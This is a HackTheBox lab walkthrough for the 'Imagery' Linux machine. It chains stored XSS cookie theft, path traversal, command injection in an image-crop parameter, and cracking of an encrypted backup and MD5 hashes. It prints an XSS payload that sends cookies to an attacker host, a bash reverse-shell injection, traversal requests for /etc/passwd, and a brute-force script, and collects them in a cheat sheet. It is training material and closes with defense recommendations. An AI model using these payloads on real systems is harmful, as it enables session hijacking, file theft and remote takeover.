# HTB - IMAGINARY - 10.10.11.88

## Imagery

> **Platform:** HackTheBox **Difficulty:** Medium **OS:** Linux (Ubuntu) **Key Techniques:** Stored XSS (Cookie Theft), LFI via Log Identifier, Command Injection in Image Transform, AES-Encrypted Backup Cracking, MD5 Hash Cracking, Lateral Movement

***

### Box Info

| Property   | Value                                  |
| ---------- | -------------------------------------- |
| IP         | `10.10.11.88`                          |
| OS         | Ubuntu (OpenSSH 9.7p1)                 |
| Web Stack  | Werkzeug 3.1.3 / Python 3.12.7 (Flask) |
| Difficulty | Medium                                 |
| User Flag  | `8ea688cc3322c0d281fb519244b9883a`     |

***

### Attack Chain Overview

```
Nmap → Flask Image Gallery (port 8000) → Bug Report Feature → Stored XSS (cookie theft) →
Admin Session Hijack → LFI via log_identifier parameter → db.json leaked →
testuser credentials → Image Transform (crop) → Command Injection → Shell as web →
AES-encrypted backup found → Cracked (bestfriends) → db.json from backup → mark's MD5 hash →
Cracked (supersmash) → SSH/su as mark → User Flag
```

***

### Reconnaissance

#### Nmap Scan

**Full TCP port scan with service detection:**

```bash
nmap -Pn -sCV -vvv -T5 10.10.11.88 -oN hacknetTCP
```

| Port | Service | Details                                        |
| ---- | ------- | ---------------------------------------------- |
| 22   | SSH     | OpenSSH 9.7p1 Ubuntu                           |
| 8000 | HTTP    | Werkzeug 3.1.3 Python/3.12.7 — "Image Gallery" |

**Key observations:**

* Only two ports open — minimal attack surface
* **Werkzeug + Python 3.12.7** indicates a Flask application
* The page title "Image Gallery" with Tailwind CSS and **DOMPurify** (`purify.min.js`) suggests the app handles user-generated content with some XSS sanitization — but the presence of the library itself hints that XSS is a concern

***

### Web Enumeration (Port 8000)

#### Technology Stack

| Component    | Version       | Notes                              |
| ------------ | ------------- | ---------------------------------- |
| Werkzeug     | 3.1.3         | Python WSGI server (Flask backend) |
| Python       | 3.12.7        | Runtime                            |
| Tailwind CSS | —             | Frontend styling                   |
| DOMPurify    | purify.min.js | Client-side XSS sanitization       |

#### Directory Fuzzing

```bash
ffuf -u http://10.10.11.88:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301 -t 50 -s
```

**Result:** No interesting directories found. The application is a single-page Flask app with API endpoints.

#### Key Endpoints Discovered (via Spidering)

| Endpoint                | Method | Purpose                        |
| ----------------------- | ------ | ------------------------------ |
| `/upload_image`         | POST   | Image upload                   |
| `/admin/get_system_log` | GET    | Log file download (admin only) |
| `/report_bug`           | POST   | Bug report submission          |
| Image transform/crop    | POST   | Server-side image manipulation |

***

### Foothold Phase 1 — Admin Session Hijack via Stored XSS

#### Identifying the XSS Vector

The bug report feature allows users to submit reports that are reviewed by an admin bot. The admin user (`admin@imagery.htb`) was identified in the report interface. Since an admin bot reviews submitted reports, this is a classic **stored XSS → cookie theft** scenario.

**What is Stored XSS with Cookie Theft?**

Stored XSS occurs when malicious JavaScript is saved on the server and executed when another user (the admin bot) views it. By injecting code that sends the victim's session cookie to an attacker-controlled server, we can hijack their authenticated session. DOMPurify protects the client-side rendering, but the bug report content is processed server-side by the admin bot in a context where sanitization may not apply.

#### Step 1: Start an HTTP server to receive the stolen cookie

```bash
sudo python3 -m http.server 80
```

#### Step 2: Submit a bug report with the XSS payload

```html
<img src=x onerror="this.src='http://<ATTACKER_IP>/?'+document.cookie; this.removeAttribute('onerror');">
```

**Why this payload works:** The `<img>` tag attempts to load an invalid source (`x`), triggering `onerror`. The error handler changes the image source to the attacker's server with the admin's cookies appended as a query parameter. `removeAttribute('onerror')` prevents infinite loops.

#### Step 3: Capture the admin session cookie

```
10.10.11.88 - - "GET /?session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-O...  HTTP/1.1" 200 -
```

#### Step 4: Replace your session cookie in the browser

Set the captured `session` value in your browser's cookie storage. You now have admin access to the application.

***

### Foothold Phase 2 — LFI via Log Identifier

#### Discovering the LFI

As admin, the `/admin/get_system_log` endpoint accepts a `log_identifier` parameter to download log files:

```
GET /admin/get_system_log?log_identifier=admin%40imagery.htb.log
```

This parameter is vulnerable to **path traversal**, allowing us to read arbitrary files from the server.

**Read /etc/passwd:**

```
GET /admin/get_system_log?log_identifier=../../../../../../etc/passwd
```

**Key finding from /etc/passwd:**

```
web:x:1001:1001::/home/web:/bin/bash
```

#### Fuzzing for Application Files

```bash
ffuf -u "http://10.10.11.88:8000/admin/get_system_log?log_identifier=../../../../../../home/web/web/FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt \
  -H "Cookie: session=<ADMIN_SESSION_COOKIE>" \
  -mc 200,500 -fs 0 -ac
```

**Result:** `db.json` found at `/home/web/web/db.json`.

#### Extracting db.json

```
GET /admin/get_system_log?log_identifier=../../../../../../home/web/web/db.json
```

**Users found in db.json:**

| Username             | Password (MD5)                     | isAdmin | isTestuser |
| -------------------- | ---------------------------------- | ------- | ---------- |
| admin@imagery.htb    | `5d9c1d507a3f76af1e5c97a3ad1eaa31` | true    | false      |
| testuser@imagery.htb | `2c65c8d7bfbca32a3ed42596192384f6` | false   | true       |
| support@imagery.com  | `434990c8a25d2be94863561ae98bd682` | false   | false      |

***

### Foothold Phase 3 — Command Injection via Image Transform

#### Identifying the Injection Point

Logging in as `testuser@imagery.htb` (using the cracked hash or the session), we find an image **crop/transform** feature. The transform endpoint accepts JSON parameters for image manipulation.

**Why this is vulnerable:** The server-side image processing passes user-controlled parameters (like the `x` coordinate) directly into a shell command without proper sanitization. By injecting a semicolon and a command, we break out of the intended operation and execute arbitrary commands.

#### Crafting the Command Injection Payload

```json
{
  "imageId": "<IMAGE_ID>",
  "transformType": "crop",
  "params": {
    "x": ";setsid /bin/bash -c \" /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1\";",
    "y": 0,
    "width": 100,
    "height": 100
  }
}
```

**Payload breakdown:**

| Component                      | Purpose                                                                                                                   |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------------------- |
| `;`                            | Terminates the previous command and starts a new one                                                                      |
| `setsid`                       | Creates a new session, detaching the process from the parent (prevents the shell from dying if the web request times out) |
| `/bin/bash -c "..."`           | Wraps the reverse shell in a new bash process with proper quoting                                                         |
| `/bin/bash -i >& /dev/tcp/...` | Bash-native reverse shell                                                                                                 |

#### Step 1: Start a listener

```bash
nc -lvnp 1234
```

#### Step 2: Send the malicious transform request via Burp or curl

**Result:** Reverse shell as `web` user.

***

### Lateral Movement — web → mark

#### Discovering the Encrypted Backup

During enumeration, an AES-encrypted backup file was found:

```
/var/web_20250806_120723.zip.aes
```

#### Cracking the AES Encryption

Transfer the encrypted file to the attacker machine and brute-force the password using `pyAesCrypt`:

```python
import pyAesCrypt
import os

encrypted_file = "web_20250806_120723.zip.aes"
output_file = "decrypted.zip"
wordlist_path = "/usr/share/wordlists/rockyou.txt"
buffer_size = 64 * 1024

def try_password(password):
    try:
        pyAesCrypt.decryptFile(encrypted_file, output_file, password.strip(), buffer_size)
        print(f"\nPASSWORD FOUND: {password.strip()}")
        return True
    except:
        return False

with open(wordlist_path, "r", encoding="latin-1", errors="ignore") as wordlist:
    for count, password in enumerate(wordlist, 1):
        if count % 10000 == 0:
            print(f"Trying password #{count}: {password.strip()}")
        if try_password(password):
            break
```

**Result:** `bestfriends`

#### Extracting Credentials from the Backup

The decrypted ZIP contains an older version of `db.json` with an additional user:

| Username         | Password (MD5)                     |
| ---------------- | ---------------------------------- |
| mark@imagery.htb | `01c3d2e5bdaf6134cec0a367cf53e535` |

**Crack with John:**

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

| Username | Password     |
| -------- | ------------ |
| mark     | `supersmash` |

#### SSH as mark

```bash
su mark
# Password: supersmash
```

***

### User Flag

```
mark@imagery:~$ cat user.txt
8ea688cc3322c0d281fb519244b9883a
```

***

### Credential Summary

| Username             | Password / Hash                  | Source                   |
| -------------------- | -------------------------------- | ------------------------ |
| admin@imagery.htb    | Session cookie stolen via XSS    | Stored XSS in bug report |
| testuser@imagery.htb | MD5 `2c65c8d7...`                | db.json via LFI          |
| support@imagery.com  | MD5 `434990c8...`                | db.json via LFI          |
| AES backup           | `bestfriends`                    | pyAesCrypt brute-force   |
| mark@imagery.htb     | `supersmash` (MD5 `01c3d2e5...`) | Backup db.json → John    |

***

### Quick Reference

```bash
# === STORED XSS (COOKIE THEFT) ===
# Start listener
sudo python3 -m http.server 80

# XSS payload for bug report
<img src=x onerror="this.src='http://<ATTACKER_IP>/?'+document.cookie; this.removeAttribute('onerror');">

# === LFI ===
# Read arbitrary files via log_identifier
curl -b "session=<ADMIN_COOKIE>" \
  "http://<TARGET>:8000/admin/get_system_log?log_identifier=../../../../../../etc/passwd"

# Extract db.json
curl -b "session=<ADMIN_COOKIE>" \
  "http://<TARGET>:8000/admin/get_system_log?log_identifier=../../../../../../home/web/web/db.json"

# Fuzz for files in web home
ffuf -u "http://<TARGET>:8000/admin/get_system_log?log_identifier=../../../../../../home/web/web/FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt \
  -H "Cookie: session=<ADMIN_COOKIE>" -mc 200,500 -fs 0 -ac

# === COMMAND INJECTION (IMAGE TRANSFORM) ===
# Payload in crop x parameter:
;setsid /bin/bash -c " /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/1234 0>&1";

# Listener
nc -lvnp 1234

# === AES BACKUP CRACKING ===
# Use pyAesCrypt brute-force script with rockyou.txt
# Password: bestfriends

# === MD5 HASH CRACKING ===
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# mark: supersmash
```

***

### Troubleshooting

| Issue                              | Solution                                                                                                                                                                                    |
| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| XSS payload doesn't fire           | DOMPurify may sanitize client-side rendering. The bug report is processed by an admin bot — ensure the payload targets the bot's rendering context, not the user-facing page                |
| Cookie not received on HTTP server | Verify your HTTP server is accessible from the target. Use port 80 (not a high port that might be firewalled). Check if the cookie has `HttpOnly` flag — if so, JavaScript cannot access it |
| LFI returns empty response         | Verify the path traversal depth. Try different numbers of `../` sequences. The application may normalize paths — try double encoding (`..%252f..%252f`)                                     |
| db.json not found via LFI          | Fuzz for the correct directory structure. The app may be in `/home/web/web/`, `/home/web/app/`, or `/opt/app/`. Use the `/etc/passwd` output to identify the home directory                 |
| Command injection doesn't trigger  | Ensure you're injecting into the correct parameter (`x` in crop). The semicolon (`;`) must properly terminate the previous command. Try different shell payloads if bash is not available   |
| Reverse shell dies immediately     | Use `setsid` to detach the process from the web request. Without it, the shell dies when the HTTP request times out                                                                         |
| pyAesCrypt brute-force is slow     | The script processes sequentially. For faster cracking, consider using `aescrypt2john` to extract the hash and crack with hashcat instead                                                   |
| MD5 hash won't crack               | Verify the hash format is correct (32 hex chars). Use `--format=Raw-MD5` with John. For hashcat, use `-m 0`                                                                                 |

***

### Key Takeaways

**What we learned:**

1. **Bug report features are prime XSS targets** — Any feature where user input is reviewed by another user (especially an admin bot) is a stored XSS vector for session hijacking
2. **DOMPurify protects the client, not the server** — Client-side sanitization libraries don't protect against server-side rendering contexts (like admin bot review pages)
3. **Log download endpoints are common LFI vectors** — Any parameter that references filenames or paths on the server should be tested for path traversal
4. **Server-side image processing is dangerous** — Functions like crop, resize, and transform often shell out to ImageMagick or similar tools. Unsanitized parameters can lead to command injection
5. **Encrypted backups with weak passwords are a goldmine** — AES encryption is only as strong as the password. A backup encrypted with `bestfriends` is trivially crackable
6. **MD5 password hashes offer no protection** — MD5 is extremely fast to crack. The `supersmash` password was found in under a second with John and rockyou.txt
7. **LFI → source code → credentials is a classic chain** — Reading application database files (db.json, config files) through LFI commonly reveals credentials stored in plaintext or weak hashes

**Attack chain summary:**

```
Stored XSS (cookie theft) → Admin session → LFI (db.json) → Command Injection (crop) →
Shell as web → AES backup cracked → mark's MD5 cracked → User flag
```

**Defense recommendations:**

* Implement `HttpOnly` and `Secure` flags on session cookies to prevent JavaScript-based cookie theft
* Use Content Security Policy (CSP) headers to restrict script execution sources
* Sanitize file path parameters server-side — never pass user input directly to file system operations
* Use parameterized commands for image processing — never concatenate user input into shell commands
* Store passwords with bcrypt/scrypt/argon2, never MD5 — MD5 provides zero resistance to cracking
* Encrypt backups with strong, randomly generated passwords — not dictionary words
* Don't store application databases (db.json) in web-accessible directories
* Process bug reports in a sandboxed environment that cannot make outbound network requests

***

### Related Topics

* \[\[Stored XSS]]
* \[\[Cookie Theft]]
* \[\[Local File Inclusion (LFI)]]
* \[\[Command Injection]]
* \[\[Flask / Werkzeug]]
* \[\[AES Encryption Cracking]]
* \[\[MD5 Hash Cracking]]
* \[\[Image Processing Vulnerabilities]]
* \[\[Lateral Movement]]

***

### Tags

`#xss` `#stored-xss` `#cookie-theft` `#lfi` `#command-injection` `#flask` `#werkzeug` `#aes-cracking` `#md5` `#lateral-movement` `#htb-medium` `#linux`
